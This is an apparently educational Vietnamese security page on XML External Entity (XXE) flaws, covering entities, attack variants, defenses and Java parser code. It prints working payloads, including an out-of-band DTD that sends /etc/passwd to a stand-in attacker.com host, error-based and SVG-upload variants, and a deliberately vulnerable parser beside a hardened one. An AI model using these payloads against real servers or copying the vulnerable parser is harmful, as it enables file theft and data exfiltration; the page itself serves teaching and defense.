# XML External Entities

> **CWE**: CWE-611 (Improper Restriction of XML External Entity Reference) | **Phân loại**: XML Attacks

## Kiến thức Nền tảng

Hãy nghĩ về XML như một cách sắp xếp dữ liệu có trật tự bằng các thẻ (tương tự như HTML). Trong XML, có một tính năng gọi là thực thể (Entities), hoạt động giống như việc bạn đặt phím tắt hoặc khai báo một biến số để tái sử dụng nhiều lần. Tuy nhiên, XML còn hỗ trợ các thực thể bên ngoài (External Entities) sử dụng từ khóa `SYSTEM` kèm theo một đường dẫn. Khi xử lý tài liệu XML này, bộ phân tích cú pháp (XML parser) sẽ tự động tìm đến đường dẫn đó để tải nội dung về đắp vào vị trí thực thể. Đường dẫn này có thể trỏ đến một file nằm ngay trên máy chủ hoặc một trang web trên mạng.

```java
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;

public class SecureXmlParser {
    public static DocumentBuilderFactory createSecureParserFactory() throws ParserConfigurationException {
        // Create a new DocumentBuilderFactory instance
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        
        // Disable DTD (Document Type Definitions) completely to prevent XXE attacks
        // The parser will throw an exception if a DOCTYPE declaration is encountered.
        String disallowDtdFeature = "http://apache.org/xml/features/disallow-doctype-decl";
        factory.setFeature(disallowDtdFeature, true);
        
        // Additional security hardening: disable XInclude and entity expansion
        factory.setXIncludeAware(false);
        factory.setExpandEntityReferences(false);
        
        return factory;
    }
}
```

## Mô tả lỗ hổng

Lỗ hổng XML External Entity (XXE) xảy ra khi ứng dụng web sử dụng một bộ phân tích XML được cấu hình lỏng lẻo, cho phép người dùng tự ý định nghĩa các thực thể bên ngoài này. Kẻ tấn công có thể gửi lên một tệp XML chứa thực thể bên ngoài trỏ tới các file hệ thống bí mật của máy chủ (ví dụ: `file:///etc/passwd`). Khi máy chủ phân tích tệp XML, nó sẽ "ngoan ngoãn" đọc nội dung file bí mật đó và trả về cho kẻ tấn công. Ngoài ra, kẻ tấn công còn có thể lợi dụng XXE để bắt máy chủ thực hiện các yêu cầu mạng nội bộ (SSRF) nhằm quét cổng dịch vụ ẩn bên trong, hoặc gửi lượng dữ liệu khổng lồ làm treo máy chủ (tấn công từ chối dịch vụ DoS).

## Cơ chế tấn công

Các biến thể tấn công XXE phổ biến bao gồm:

*   **Blind XXE (Out-of-Band - OOB)**: Khi ứng dụng không trả về kết quả phân giải XML trong phản hồi HTTP, kẻ tấn công sử dụng một DTD bên ngoài để gửi dữ liệu ra máy chủ ngoại vi thông qua DNS hoặc HTTP.
    *   *Payload gửi lên ứng dụng*:
        ```xml
        <!DOCTYPE foo [
          <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
          %dtd;
        ]>
        <foo>&exfil;</foo>
        ```
    *   *Nội dung tệp `evil.dtd` trên máy chủ kẻ tấn công*:
        ```xml
        <!ENTITY % file SYSTEM "file:///etc/passwd">
        <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
        %eval;
        ```
*   **Parameter Entity XXE**: Sử dụng thực thể tham số (bắt đầu bằng `%`) để định nghĩa cấu trúc lồng nhau trong DTD, giúp vượt qua các hạn chế về mặt cú pháp của bộ phân tích XML nội bộ.
    *   *Payload*:
        ```xml
        <!DOCTYPE foo [
          <!ENTITY % file SYSTEM "file:///etc/passwd">
          <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
          %eval;
        ]>
        ```
*   **XXE via File Upload**: Kẻ tấn công tải lên các định dạng tệp dựa trên XML như SVG (đồ họa vector) hoặc DOCX (văn bản Word) chứa thực thể độc hại.
    *   *Payload SVG chứa XXE*:
        ```xml
        <?xml version="1.0" standalone="yes"?>
        <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
        <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
          <text font-size="16" x="0" y="16">&xxe;</text>
        </svg>
        ```
*   **Error-based XXE**: Kẻ tấn công cố tình tạo ra lỗi cú pháp hoặc lỗi nạp tài nguyên trong đó thông điệp lỗi của hệ thống chứa nội dung tệp nhạy cảm cần đọc.
    *   *Payload*:
        ```xml
        <!DOCTYPE foo [
          <!ENTITY % file SYSTEM "file:///etc/passwd">
          <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///invalid/%file;'>">
          %eval;
          %error;
        ]>
        ```

## Biện pháp phòng thủ

- **Tóm tắt**: Vô hiệu hóa DTD và các thực thể bên ngoài trên mọi bộ phân tích cú pháp XML được sử dụng trong ứng dụng.
- **Các bước chi tiết**:
  - Cấu hình tắt tính năng `disallow-doctype-decl` trong Java, hoặc tắt `resolve_entities` và `external_dtd` trong Python/PHP.
  - Vệ sinh các tệp tải lên (SVG, DOCX) trước khi xử lý, hoặc sử dụng các thư viện phân tích an toàn mặc định như `defusedxml` trong Python.
  - Sử dụng các định dạng trao đổi dữ liệu an toàn hơn như JSON khi có thể.

## Code Example

```java
// === VULNERABLE CODE (Java DocumentBuilder) ===
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.xml.sax.InputSource;
import java.io.StringReader;

public class XmlParserVulnerable {
    public void parse(String xmlInput) throws Exception {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        // DANGER: By default, DocumentBuilderFactory resolves external entities and DTDs
        DocumentBuilder db = dbf.newDocumentBuilder();
        db.parse(new InputSource(new StringReader(xmlInput)));
    }
}

// === SECURE CODE (Java DocumentBuilder) ===
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

public class XmlParserSecure {
    public void parse(String xmlInput) throws Exception {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        
        // SECURE: Disable DTD declarations completely
        dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        
        // SECURE: Disable external entities if DTDs cannot be fully disabled
        dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        
        DocumentBuilder db = dbf.newDocumentBuilder();
        db.parse(new InputSource(new StringReader(xmlInput)));
    }
}
```

## Xem thêm

- [XML Bombs](../../10-exceptional-conditions/xml-bombs/) — Kỹ thuật tấn công từ chối dịch vụ (DoS) lợi dụng cơ chế mở rộng thực thể XML để tiêu tốn bộ nhớ máy chủ (Billion Laughs attack).
- [Server-Side Request Forgery](../../01-broken-access-control/ssrf/) — Lỗ hổng giả mạo yêu cầu từ phía máy chủ, thường được kết hợp với XXE để quét cổng hoặc gửi truy vấn nội bộ.

## Nguồn tham khảo

- PortSwigger: https://portswigger.net/web-security/xxe
- OWASP: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- CWE: https://cwe.mitre.org/data/definitions/611.html

## Giải thích thuật ngữ

- **XXE (XML External Entity)**: Lỗ hổng bảo mật liên quan đến thực thể bên ngoài XML, cho phép đọc file hoặc tạo yêu cầu mạng trái phép.
- **DTD (Document Type Definition)**: Tập hợp các quy tắc định nghĩa cấu trúc của một tài liệu XML.
- **XML Entity**: Thực thể đóng vai trò như một hằng số hoặc một biến để tái sử dụng dữ liệu trong XML.
- **XML Parser**: Bộ xử lý giúp phân tích cú pháp và dựng cấu trúc tài liệu XML.
- **SSRF (Server-Side Request Forgery)**: Tấn công giả mạo yêu cầu từ phía máy chủ, bắt máy chủ gửi truy vấn mạng tới các địa chỉ khác.
